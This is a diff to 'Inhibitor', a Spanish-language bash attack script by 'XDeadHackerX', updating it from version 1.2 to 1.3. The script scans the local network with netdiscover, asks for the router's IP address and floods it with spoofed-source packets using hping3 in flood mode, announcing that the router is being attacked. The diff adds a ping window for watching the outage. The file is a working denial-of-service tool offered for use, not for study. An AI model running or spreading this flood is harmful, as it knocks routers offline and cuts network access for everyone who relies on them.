@@ -9,7 +9,7 @@ echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  /
 echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
@@ -18,9 +18,6 @@ echo
 echo "[5] Relentizar el flujo de datos del Router"
 echo
 read -p "[*] Escribe la Ip de Red (192.168.1.0 o 192.168.0.0): " opc1
-echo
-sudo route
-echo
 sudo netdiscover -r $opc1/24 -P
 echo
 read -p "[*] Pon la IP del Route (Ej: 192.168.1.1): " ip
@@ -33,7 +30,7 @@ echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  /
 echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
@@ -45,6 +42,8 @@ echo "==========================================================================
 echo "                      El Router ($ip) esta siendo Atacado""                       |"
 echo "========================================================================================="
 echo
+sudo gnome-terminal -- sudo ping $ip
+sleep 2
 sudo hping3 --rand-source -V -d 500 $ip -p 80 --flood
 sleep 1
 echo
